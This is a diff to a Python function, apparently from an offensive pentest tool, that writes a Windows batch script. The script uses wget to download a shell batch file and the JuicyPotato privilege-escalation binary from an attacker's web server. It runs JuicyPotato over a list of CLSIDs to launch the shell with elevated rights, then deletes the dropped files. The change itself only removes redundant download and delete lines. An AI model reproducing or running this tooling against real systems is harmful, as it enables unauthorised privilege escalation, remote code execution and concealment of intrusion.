@@ -40,8 +40,6 @@ def create_bat_potato():
         file = open(OUTPUT_BAT_NAME, "w")
         file.write(f"ECHO Attempting to get {SHELL_BAT_NAME} from server\n")
         file.write(f"{JUICY_REMOTE_PATH}\\{WGET_BIN} http://{LHOST}:{LWEBSERVER_PORT}/{SHELL_BAT_NAME}\n")
-        file.write(f"ECHO Attempting to get {OUTPUT_BAT_NAME} from server\n")
-        file.write(f"{JUICY_REMOTE_PATH}\\{WGET_BIN} http://{LHOST}:{LWEBSERVER_PORT}/{OUTPUT_BAT_NAME}\n")
         file.write(f"ECHO Attempting to get {JUICY_POTATO_BIN} from server\n")
         file.write(f"{JUICY_REMOTE_PATH}\\{WGET_BIN} http://{LHOST}:{LWEBSERVER_PORT}/{JUICY_POTATO_BIN}\n")
 
@@ -53,7 +51,6 @@ def create_bat_potato():
                 file.write(f"{JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN} -p {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME} -l {LPORT} -t * -c " + line)
         
         file.write("del {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME}")
-        file.write("del {JUICY_REMOTE_PATH}\\{OUTPUT_BAT_NAME}")
         file.write("del {JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN}")
 
         file.close()
